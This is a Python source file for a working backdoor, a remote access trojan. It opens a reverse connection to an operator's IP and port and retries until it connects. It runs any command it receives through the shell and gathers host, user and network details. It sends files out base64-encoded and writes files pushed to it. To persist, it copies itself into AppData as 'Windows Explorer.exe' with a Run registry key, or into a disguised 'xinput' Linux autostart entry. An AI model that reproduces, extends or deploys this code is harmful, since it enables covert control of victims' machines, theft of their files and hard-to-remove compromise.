#!/usr/bin/env python
import socket
import subprocess,json
import os
import base64
import threading
import platform, sys, shutil, stat

class Backdoor:
    def __init__(self,ip,port):

        def connect_if_available():
            try:
                self.make_connection(ip,port)
            except Exception:
                timer = threading.Timer(5, connect_if_available)
                timer.start()
                timer.join()

        connect_if_available()

    def make_connection(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def relaible_send(self,data):
        json_data = json.dumps(data.decode())
        self.connection.send(json_data.encode())


    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                temp_json_data = self.connection.recv(1024)
                json_data = json_data + temp_json_data.decode()
                return json.loads(json_data)
            except json.decoder.JSONDecodeError:
                continue


    def execute_on_target_machine(self, command):
        try:
            return subprocess.check_output((" ").join(command),shell=True)
        except subprocess.CalledProcessError:
            return f"{command[0]}: command not found".encode()

    def cd(self, path):
        try:
            os.chdir(path)
            return f""
        except FileNotFoundError:
            return f"cd: {path}: No such file or directory"

    def get_system_info(self):
        return f"\nHOST NAME : {os.getlogin()}\nOS TYPE : {platform.system()}\nMACHINE TYPE : {platform.machine()} \nNODE NAME: {platform.node()} \nPROCESSOR NAME: {platform.processor()} \nPLATFORM VERSION: {platform.version()} \nOTHER INFO : {platform.platform()}\n\t\t{platform.uname()}".encode()

    def read_file(self,path):
        with open(path, "rb")as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path.split('/')[-1], "wb")as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] file uploaded successfully"

    def run(self):
        while True:
            command = self.reliable_recieve()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command)>1:
                    command_output = self.cd(command[1]).encode()
                elif command[0] == "cwd":
                    command_output = os.getcwd().encode()
                elif command[0] == "nodename":
                    command_output = platform.node().encode()
                elif command[0] == "userinfo":
                    command_output = os.getlogin().encode()
                elif command[0] == "systeminfo":
                    command_output = self.get_system_info()
                elif command[0] == "network_info":
                    if platform.system()=="Windows":
                        command_output =self.execute_on_target_machine("ipconfig".split(' '))
                    else:
                        command_output=self.execute_on_target_machine("ifconfig".split(' '))
                elif command[0] == "download":
                    command_output = self.read_file(command[1])
                elif command[0] == "upload":
                    command_output = self.write_file(command[1],command[2])
                    command_output = command_output.encode()
                else:
                    command_output = self.execute_on_target_machine(command)
            except Exception:
                command_output = "[-] error during command execution".encode()
            self.relaible_send(command_output)
        self.connection.close()

    def become_persistent(self):
        if sys.platform.startswith("win"):
            self.become_persistent_on_windows()
        elif sys.platform.startswith("linux"):
            self.become_persistent_on_linux()
        else:
            self.become_persistent_on_mac()


    def become_persistent_on_windows(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "{evil_file_location}"',shell=True)

    def become_persistent_on_linux(self):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            try:
                os.makedirs(autostart_path)
            except Exception:
                pass

            destination_file = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, destination_file)
            self.chmod_to_exec(destination_file)

            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + destination_file + "\n")

            self.chmod_to_exec(autostart_file)
            subprocess.Popen(destination_file)
            sys.exit()

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)

    def become_persistent_on_mac(self):
        pass